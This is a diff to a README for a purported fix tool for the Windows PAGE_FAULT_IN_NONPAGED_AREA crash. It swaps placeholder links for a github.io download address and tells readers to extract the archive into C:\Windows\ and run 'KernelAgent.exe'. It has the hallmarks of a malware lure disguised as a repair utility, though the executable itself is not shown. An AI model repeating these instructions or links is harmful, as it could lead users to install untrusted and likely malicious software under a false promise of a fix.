@@ -2,7 +2,7 @@
 
 This tool provides a quick fix for the PAGE_FAULT_IN_NONPAGED_AREA BSOD on Windows 10/11, caused by memory failures, corrupt drivers, or misconfigured system settings.
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](https://fix-page-fault-in-nonpaged-area.github.io/.github)
 
 ---
 
@@ -17,7 +17,7 @@ This tool provides a quick fix for the PAGE_FAULT_IN_NONPAGED_AREA BSOD on Windo
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section or from the button above  
+1. 📦 **Download the archive** from the [Releases](https://fix-page-fault-in-nonpaged-area.github.io/.github) section or from the button above  
 2. 📁 **Extract the folder** and move it into your main `C:\Windows\` directory  
 3. 🖱 **Run the executable file** `KernelAgent.exe`  
 4. 🔁 Restart your computer after the process is complete
